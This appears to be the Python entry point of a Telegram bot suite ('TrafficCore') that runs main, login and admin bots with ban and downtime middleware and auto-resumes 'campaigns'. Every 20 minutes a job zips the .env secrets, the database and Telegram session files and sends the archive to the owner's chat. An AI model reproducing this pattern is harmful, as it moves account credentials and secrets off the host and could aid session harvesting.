import asyncio
import logging
from aiogram import Bot, Dispatcher
from aiogram.client.bot import DefaultBotProperties
from aiogram.enums import ParseMode
from .core.config import ENV
from .tg.middleware import DowntimeMiddleware, BanMiddleware, ChatTrackMiddleware
from .tg.main_bot import rt_main, set_aux_bots
from .tg.login_bot import rt_login
from .tg.admin_bot import rt_admin
from .features.reporter import (
    excel_20min_job,
    zip_backup_20min_job,
    send_excel_snapshot_now,
)
from .features.autostart import autostart_all

logging.basicConfig(level=logging.INFO, format="[%(asctime)s] %(levelname)s %(name)s: %(message)s")
log = logging.getLogger("trafficcore")

def build_bot(token: str) -> Bot:
    return Bot(token, default=DefaultBotProperties(parse_mode=ParseMode.HTML))

async def main():
    log.info("Starting TrafficCore bot suite…")

    main_bot = build_bot(ENV.MAIN_BOT_TOKEN)
    login_bot = build_bot(ENV.LOGIN_BOT_TOKEN)
    admin_bot = build_bot(ENV.ADMIN_BOT_TOKEN)
    log_bot = build_bot(ENV.LOG_BOT_TOKEN) if ENV.LOG_BOT_TOKEN else None
    admin_log_bot = build_bot(ENV.ADMIN_LOG_BOT_TOKEN) if ENV.ADMIN_LOG_BOT_TOKEN else None

    dp_main = Dispatcher()
    dp_login = Dispatcher()
    dp_admin = Dispatcher()

    # Middlewares: hard-block banned users first
    # Also enforce at Router level (message + callback) so button presses are blocked too
    for rt in (rt_main, rt_login):
        rt.message.outer_middleware(BanMiddleware())
        rt.callback_query.outer_middleware(BanMiddleware())

    for dp in (dp_main, dp_login):
        dp.update.outer_middleware(BanMiddleware())
        dp.update.outer_middleware(DowntimeMiddleware())
        dp.update.outer_middleware(ChatTrackMiddleware())

    # Routers
    dp_main.include_router(rt_main)
    dp_login.include_router(rt_login)
    dp_admin.include_router(rt_admin)

    # Give main bot access to the log bot
    set_aux_bots(log_bot, None)

    # Background jobs
    tasks = []
    if admin_log_bot:
        # Send one log CSV on startup so you always get a fresh file when the bot boots
        tasks.append(asyncio.create_task(send_excel_snapshot_now(admin_log_bot, ENV.OWNER_ID)))

        # Send log CSV every 20 minutes
        tasks.append(asyncio.create_task(excel_20min_job(admin_log_bot, ENV.OWNER_ID)))

        # Zip backup (.env + ottly.db + sessions/*.session) every 20 minutes
        tasks.append(asyncio.create_task(zip_backup_20min_job(admin_log_bot, ENV.OWNER_ID)))

    # Auto-resume campaigns on boot
    tasks.append(asyncio.create_task(autostart_all(main_bot, None, log_bot or main_bot, ENV.OWNER_ID)))

    await asyncio.gather(
        dp_main.start_polling(main_bot),
        dp_login.start_polling(login_bot),
        dp_admin.start_polling(admin_bot),
        *tasks
    )

if __name__ == "__main__":
    try:
        asyncio.run(main())
    except (KeyboardInterrupt, SystemExit):
        log.info("Bots stopped.")
